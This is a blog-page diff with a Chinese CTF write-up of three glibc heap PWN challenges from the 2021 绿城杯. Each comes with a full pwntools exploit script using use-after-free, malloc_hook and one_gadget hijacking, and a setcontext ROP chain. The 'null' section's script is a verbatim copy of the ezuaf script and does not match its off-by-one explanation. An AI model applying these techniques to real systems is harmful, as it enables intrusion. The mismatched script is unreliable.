@@ -1,0 +1,440 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>2021绿城杯 - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="前言这次PWN题对我这种pwn👶可算是友好至极阿，感...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '总之岁月漫长，然而值得等待！',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: true,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: '/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">2021绿城杯</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">2021绿城杯</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>October 01, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>7237</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次PWN题对我这种pwn👶可算是友好至极阿，感受一下大佬在比赛中的杀穿的快感！不过还是不要被这些假象迷了眼，其实还是个蹒跚学步的pwn👶，继续加油！</p>
+<h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img   class="lazyload" data-original="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210929173017054</span></p>
+<p>如题名字，存在UAF，借着UAF泄露libc地址，然后直接修改释放fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img   class="lazyload" data-original="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210929173224666</span></p>
+<p>在申请功能里面的输入点存在很明显的offbyone，通过offbyone制造overlap，可以泄露出libc，然后修改被重叠的fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img   class="lazyload" data-original="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210929172949043</span></p>
+<p>程序存在UAF，借着UAF把堆块劫持到tcache上，获得libc，同时修改tcache结构，获得任意地址写</p>
+<p>因为开了沙箱，所以堆上布置rop链进行orw</p>
+<p>最后释放堆块触发setcontext去执行到rop</p>
+<p>嘿嘿，经过一段时间的学习，总算掌握了这种在堆上布置rop链的手法了，该去学习新的知识了！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;10&#x2F;01&#x2F;2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;10&#x2F;01&#x2F;2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN&#x2F;index.html</a></li>
